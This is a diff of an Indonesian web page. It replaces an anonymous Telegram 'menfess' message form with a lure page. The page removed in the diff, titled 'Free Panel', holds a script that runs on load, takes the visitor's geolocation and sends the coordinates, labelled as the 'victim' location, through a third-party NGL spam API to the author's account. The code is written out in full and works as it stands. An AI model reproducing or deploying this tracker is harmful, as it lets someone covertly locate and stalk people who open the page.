@@ -1,73 +1,23 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>Free Panel</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
-      color: white;
-      text-align: center;
-      padding: 100px 20px;
-    }
-    h2 {
-      font-size: 1.8em;
-      background: rgba(0, 0, 0, 0.2);
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-      display: inline-block;
-      max-width: 600px;
-      animation: fade 1s ease-out;
-    }
-    @keyframes fade {
-      0% { opacity: 0; transform: translateY(20px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>Kirim Pesan ke Telegram</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <h2>Sedang mengambil lokasi korban...</h2>
+  <h2>Menfess Telegram</h2>
+  <form id="formPesan">
+    <input type="number" id="user" placeholder="Tulis ID target..." required />
+    <input type="text" id="from" placeholder="Tulis nama pengirim..." required />
+    <input type="text" id="pesan" placeholder="Tulis pesan..." required />
+    <button type="submit">Kirim</button>
+    <div id="notifikasi">Pesan berhasil dikirim!</div>
+  </form>
+  <footer>
+    <p>© Vinzz Official⚡</p>
+  </footer>
 
-  <script>
-    async function kirimLokasi() {
-      if (!navigator.geolocation) {
-        document.body.innerHTML = '<h2>Browser tidak mendukung geolokasi.</h2>';
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
-        const pesan = `Lokasi korban ditemukan:\nLatitude: ${lat}\nLongitude: ${lon}\nMap: ${gmaps}`;
-        const encodedPesan = encodeURIComponent(pesan);
-
-        const nglUrl = `https://fastrestapis.fasturl.cloud/tool/spamngl?link=https://ngl.link/vinzz_official&message=${encodedPesan}&type=anonymous&count=1`;
-
-        try {
-          const res = await fetch(nglUrl);
-          if (res.ok) {
-            document.body.innerHTML = '<h2>Lokasi berhasil dikirim!<br><small>by Vinzz Official</small></h2>';
-          } else {
-            document.body.innerHTML = '<h2>Gagal mengirim lokasi ke developer</h2>';
-          }
-        } catch (error) {
-          document.body.innerHTML = '<h2>Terjadi kesalahan saat mengirim lokasi.</h2>';
-        }
-      }, (err) => {
-        if (err.code === 1) {
-          document.body.innerHTML = '<h2>Lokasi ditolak. Harap izinkan akses lokasi di perangkat Anda.</h2>';
-        } else {
-          document.body.innerHTML = '<h2>Terjadi kesalahan saat mengambil lokasi.</h2>';
-        }
-      });
-    }
-
-    kirimLokasi();
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
